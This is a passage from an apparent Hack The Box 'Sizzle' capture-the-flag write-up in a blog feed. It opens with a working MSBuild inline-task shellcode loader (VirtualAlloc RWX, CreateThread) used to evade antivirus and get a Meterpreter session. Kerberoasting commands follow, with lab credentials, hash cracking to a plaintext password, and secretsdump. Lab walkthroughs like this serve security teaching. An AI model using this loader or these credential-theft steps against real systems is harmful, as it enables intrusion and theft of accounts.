0xe1,0x18,0x90,0xd1,0xa0,0x00,0x76,0x59,0x14,0x86,0xe5,0xb6,0x31,0xf4,0x9b,
0xea,0x01,0x43,0xf0,0x8c,0xc9,0x36,0x9d,0x9d,0x40,0xe1,0x0f,0xcc,0xdd,0xb6,
0x8f,0x49,0xfa,0x2c,0x89,0xb8,0x4e,0x7b,0x18,0x25,0x60,0x7e,0x7f,0x54,0xcc,
0xfa,0x07,0x7a,0x67,0x72,0xb3,0x89,0xf8,0x66,0x41,0x6b,0x34,0x03,0x11,0x12,
0xd1,0xdd,0x39,0x36,0x30,0x23,0xdf,0x87,0xa2,0x65,0x61,0x66,0x1f,0x54,0x3f,
0x46,0xb5,0x74,0x71,0xb9,0x38,0x8a,0xb4,0xa0,0xfc,0x3c,0x43,0xec,0x51,0xc6,
0x6f,0xab,0xde,0x4d,0xd1,0x7e,0x45,0xb5,0x08,0x85,0x41,0x25,0x58,0x02,0x26,
0xdf,0x24,0xcd,0x06,0x41,0x4f,0x96,0xe4,0x13,0x43,0xc0,0x05,0xf7,0xac,0x31,
0x89,0x1d,0x42,0x7d,0x47,0x83,0x3b,0x41,0x64,0xc2,0xba,0x3b,0x38,0xdb,0xde,
0x32,0x26,0x3c,0xe7,0xab,0x5c,0x01,0x37,0x35,0x32,0x1a,0x25,0xa2,0x30,0x69,
0xf0,0x2c,0xfe,0x5a,0x9b,0x94,0xc7,0x3d,0xfb,0x37,0x74,0x4e,0x58,0xef,0x78,
0xd6,0xdf,0xbd,0x18,0x34,0x09,0xd4,0x6d,0xca,0x47,0xb6,0xbf,0x77,0xf8,0x31,
0x2b,0xc2,0x1f,0xf9,0x93,0x98,0xaf,0xe5,0x86,0xe3,0x35,0xc6,0x57,0xdf,0x17,
0x1d,0x0a,0xec,0x3e,0x45,0xb2,0xc8,0xa8,0x45,0x70,0xc2,0x8d,0xe8,0x05,0x68,
0xb2,0xd1,0x36,0x67,0x63,0xd6,0xa9,0x82,0x99,0x14,0x98,0x45,0xc1,0x3c,0x87,
0x21,0xb2,0x6c,0x71,0x72,0xb1,0x80,0x11,0x74,0x05,0xed,0x15,0x96,0x88,0x9b,
0x44,0x16,0x10,0xa7,0x00,0x02,0xf2,0x77,0xa5,0xc1,0xdf,0xe3,0xd9,0xd6,0xf9,
0xfd,0xb0,0x27,0x0a,0x07,0x31,0xf4,0x4f,0x22,0x7d,0xc1,0x20,0xbd,0x87,0x30,
0x99,0xd9,0x52,0xcf,0xa4,0x79,0x10,0x01,0x33,0x59,0xc9,0x89,0xa6,0xd5,0xb8,
0xd0,0xe7,0x80,0x7b,0xe4,0xc3,0x3b,0x9d,0x9c,0x9d,0x9c,0xea,0xba,0xab,0x54,
0x4a,0x87,0xe1,0x7d,0x71,0xe9,0xe9,0xbb,0xd9,0x17,0xdc,0xd3,0x3f,0xbf,0x4c,
0x7f,0xcd,0xde,0xa0,0x64,0x41,0x20,0xb4,0x24,0x30,0x57,0xcf,0xe8,0x04,0xc2,
0xe4,0x7c,0xb2,0xa5,0x28,0x33,0x6c,0xe8,0x7b,0x9a,0xac,0xc9,0x0c,0xb3,0xb7,
0x48,0xbd,0xb3,0x6a,0xf1,0xfc,0x31,0xcb,0x21,0x39,0x32,0x97,0x7b,0x3c,0x9e,
0x66,0xfa,0xca,0xfe,0xa3,0xcb,0x41,0x2f,0x0f,0x4b,0x6d,0x0b,0x54,0x78,0x2e,
0x85,0x51,0xa5,0x51,0x76,0xef,0xf5,0xf3,0xa7,0xff,0x4a,0x5f,0x7b,0x8d,0xb0,
0x15,0x85,0x78,0xbb,0xd3,0x0a,0x21,0x46,0x3f,0xeb,0x6c,0x9b,0xed,0xd5,0x80,
0xaa,0xf2,0x6b,0x48,0xb1,0x88,0x39,0x3c,0xa8,0x68,0x50,0x06,0xb5,0xa5,0x23,
0x6c,0x8e,0x0c,0xa5,0x95,0x38,0x45,0xfc,0xf5,0xe8,0x7a,0xcb,0xf6,0x91,0xd9,
0xbc,0x9a,0x4b,0x1a,0x60,0xb1,0xc6,0xa7,0xc5,0x0e,0x4b,0xc1,0x74,0xc7,0x74,
0x0e,0xe2,0xdb,0xca,0xce,0xee,0xf4,0x5d,0x80,0xa6,0x7f,0x05,0x8c,0xf1,0xa4,
0x63,0x5e,0xd2,0xca,0xb0,0xc0,0xd1,0xb8,0xb1,0x22,0x8e,0x26,0xac,0x55,0xd4,
0x41,0x36,0x42,0xff,0xb6,0xfc,0x87,0x62,0xfe,0x8b,0x4f,0x47,0x83,0xc4,0x93,
0x38,0x7c,0xfb,0x55,0xa3,0xd8,0xc2,0x53,0x1f,0x27,0x47,0x75,0x56,0xfc,0xcd,
0xc9,0x9e,0x08,0xfe,0x35,0x74,0x2a,0xf3,0x27,0x22,0xad,0x8e,0x41,0xde,0xb6,
0xf2,0xf2,0xe8,0xb7,0x82,0x3b,0x66,0x38,0x95,0x46,0x4e,0x35,0x75,0x48,0x86,
0xab,0xdd,0x43,0x08,0xc7,0xcd,0x29,0xac,0x20,0xb5,0x3a,0x75,0x5f,0x39,0x85,
0xf1,0xd4,0xd4,0xf6,0xb6,0x35,0x65,0xc4,0x57,0x05,0x69,0x90,0x9a,0xfb,0x18,
0xee,0x0d,0xd3,0x02,0xae,0x40,0x38,0xac,0xaa,0x40,0x4c,0x9c,0xc9,0x3a,0xca,
0x24,0x09,0xe7,0x0c,0x8c,0x68,0xb5,0x66,0x61,0x78,0xf2,0xd0,0x29,0xea,0x33,
0xeb,0xb5,0x4d,0xc4,0xc8,0x8e,0xf1,0x28,0xdf,0xed,0xee,0xe9,0x29,0xc5,0x91,
0xea,0x1f,0x7d,0x47,0xbd,0xf9,0xde,0x66,0x58 };


              
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]&amp;gt;
      &amp;lt;/Code&amp;gt;
    &amp;lt;/Task&amp;gt;
  &amp;lt;/UsingTask&amp;gt;
&amp;lt;/Project&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\system32\spool\drivers\color\shellcode.xml&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;this-time-it-worked-and-i-got-meterpreter-&quot;&gt;This time it worked and I got &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;kerberoasting-privilege-escalation&quot;&gt;Kerberoasting, Privilege Escalation&lt;/h3&gt;
&lt;h4 id=&quot;now-we-have-a-meterpreter-session-we-can-route-the-internal-subnet-use-a-proxy-then-use-getuserspnspy-and-see-if-any-user-is-kerberoastable-this-technique-is-covered-here&quot;&gt;Now we have a &lt;code class=&quot;highlighter-rouge&quot;&gt;meterpreter&lt;/code&gt; session, we can route the internal subnet, use a proxy then use &lt;code class=&quot;highlighter-rouge&quot;&gt;GetUserSPNs.py&lt;/code&gt; and see if any user is kerberoastable. This technique is covered &lt;a href=&quot;https://www.blackhillsinfosec.com/a-toast-to-kerberoast/&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;first-thing-is-to-configure-proxychains-to-use-port-8080-&quot;&gt;First thing is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use port 8080 :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-and-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route and set up the proxy :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;route add 10.10.10.0 255.255.255.0 1&lt;/code&gt; this adds a route of the whole internal subnet where &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is the session number.&lt;/h4&gt;
&lt;h4 id=&quot;now-we-are-ready-lets-kerberoast-&quot;&gt;Now we are ready. Let’s kerberoast !&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains GetUserSPNs.py -request -dc-ip 10.10.10.103 HTB.LOCAL/amanda:Ashare1972&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;user-mrlky-was-kerberoastable-and-we-got-a-hash-lets-pass-it-to-john-&quot;&gt;User &lt;code class=&quot;highlighter-rouge&quot;&gt;mrlky&lt;/code&gt; was kerberoastable and we got a hash, let’s pass it to &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;password-is-football7-now-we-can-use-secretdumppy-again-and-do-the-same-thing-we-did-before-&quot;&gt;Password is &lt;code class=&quot;highlighter-rouge&quot;&gt;Football#7&lt;/code&gt;, now we can use &lt;code class=&quot;highlighter-rouge&quot;&gt;secretdump.py&lt;/code&gt; again and do the same thing we did before :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/43.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/44.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/45.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/sizzle/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---help&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Active Directory" /><category term="Windows Exploitation" /><category term="Networking" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/sizzle/0.png" /></entry></feed>